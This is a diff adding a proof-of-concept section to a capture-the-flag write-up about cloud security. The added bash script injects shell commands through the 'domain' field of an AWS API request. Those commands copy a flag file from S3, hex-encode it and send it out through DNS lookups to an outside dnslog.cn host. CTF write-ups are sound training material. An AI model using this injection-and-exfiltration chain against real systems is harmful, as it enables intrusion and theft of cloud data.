@@ -612,3 +612,38 @@ def lambda_handler(event, context):
 <div align="center">
   <sub>🛡️ Documented by <b>Agent freecandy</b> • Cloud Escape CTF 2026 • Advanced Cloud Infrastructure Security</sub>
 </div>
+
+
+---
+
+## Proof of Concept (PoC) Exploit
+
+The following is a standalone bash script that automates the complete Stage 1 exploitation, from OIDC authentication to DNS exfiltration.
+
+```bash
+#!/bin/bash
+# Stage 1: OIDC to DNS Exfiltration PoC
+
+# 1. Assume cicdRole via OIDC (Requires GH Actions Environment)
+echo "[*] Assuming Role via OIDC..."
+# (Assuming AWS credentials are set via aws-actions/configure-aws-credentials)
+
+# 2. Command Injection Payload targeting nslookupv2
+API_ID="3q931syi7b"
+URL="https://${API_ID}.execute-api.us-east-1.amazonaws.com/dev/nslookupv2"
+
+echo "[*] Crafting payload to exfiltrate s3://codec4f26c862a321ef5/flag.txt via DNS..."
+cat << 'EOF' > payload.json
+{
+  "domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c 'import binascii; print(binascii.hexlify(open("/tmp/flag.txt","rb").read()).decode())'); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"
+}
+EOF
+
+# 3. Trigger Exploit
+echo "[*] Triggering Exploit..."
+awscurl --service execute-api --region us-east-1 -X POST "$URL" -H "Content-Type: application/json" -d @payload.json
+
+# 4. Decoding Flag
+echo "[*] Check your DNS log server for the hex-encoded flag."
+echo "[*] Example decode: echo '3161316a...' | xxd -r -p"
+```
